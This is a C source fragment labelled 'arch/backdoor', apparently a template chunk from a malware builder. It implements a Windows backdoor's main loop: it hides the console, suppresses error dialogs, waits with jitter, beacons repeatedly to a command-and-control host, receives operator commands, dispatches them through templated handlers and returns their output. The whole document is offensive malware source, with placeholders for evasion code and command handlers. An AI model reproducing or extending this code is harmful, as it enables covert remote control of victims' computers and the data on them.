// chunk: arch/backdoor
// depends: core/emit_buffer
// provides: main
// note: beacon-loop backdoor with bidirectional C2 command dispatch

#ifndef CHUNK_ARCH_BACKDOOR
#define CHUNK_ARCH_BACKDOOR

#ifdef USE_OBF_SLEEP
#define BEACON_SLEEP(ms) obf_sleep(ms)
#else
#define BEACON_SLEEP(ms) Sleep(ms)
#endif

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    {{EVASION_INIT}}
    Sleep(3000 + (GetTickCount() % 5000));

    int max_retries = 100;
    while (max_retries-- > 0) {
        if (!c2_connect(C2_ADDR, C2_PORT)) {
            BEACON_SLEEP(30000 + (GetTickCount() % 90000));
            continue;
        }
        max_retries = 100;
        c2_heartbeat();

        char *cmd_buf = (char *)malloc(1024 * 1024);
        char *out_buf = (char *)malloc(1024 * 1024);
        if (!cmd_buf || !out_buf) { free(cmd_buf); free(out_buf); break; }

        while (1) {
            c2_hdr_t hdr;
            if (!c2_recv_cmd(&hdr, cmd_buf, 1024 * 1024)) break;

            DWORD out_len = 1024 * 1024;
            int rc = 0;

            switch (hdr.cmd_id) {
                case 0x01:
                    c2_heartbeat();
                    continue;
                {{COMMAND_DISPATCH}}
                case 0x0D:
                    c2_send_result(0x0D, "bye", 3);
                    free(cmd_buf); free(out_buf);
                    c2_disconnect();
                    return 0;
                case 0xFF:
                    continue;
                default:
                    c2_send_result(hdr.cmd_id, "ERR:unknown", 11);
                    continue;
            }

            if (rc == 0) {
                c2_send_result(hdr.cmd_id, out_buf, out_len);
            } else {
                c2_send_result(hdr.cmd_id, "ERR:failed", 10);
            }

            Sleep(100 + (GetTickCount() % 500));
        }

        free(cmd_buf); free(out_buf);
        c2_disconnect();
        BEACON_SLEEP(30000 + (GetTickCount() % 90000));
    }
    return 0;
}

#endif
